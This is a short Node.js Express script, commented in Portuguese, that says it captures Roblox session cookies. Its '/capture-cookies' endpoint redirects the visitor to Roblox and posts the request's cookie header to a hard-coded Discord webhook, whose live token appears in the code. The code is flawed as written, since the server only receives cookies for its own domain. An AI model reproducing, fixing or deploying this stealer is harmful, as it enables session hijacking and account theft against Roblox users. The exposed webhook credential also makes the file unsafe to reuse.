const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));

// Endpoint para capturar os cookies do Roblox e enviar para o Discord
app.get('/capture-cookies', (req, res) => {
    // Abrir o Roblox
    res.redirect('https://www.roblox.com/');

    // Capturar os cookies
    const cookies = req.headers.cookie;

    // Enviar os cookies para o Discord webhook
    const data = {
        content: "Cookies: " + cookies
    };

    fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
        }
        console.log('Mensagem enviada com sucesso para o Discord!');
    })
    .catch(error => {
        console.error('Erro:', error);
    });
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
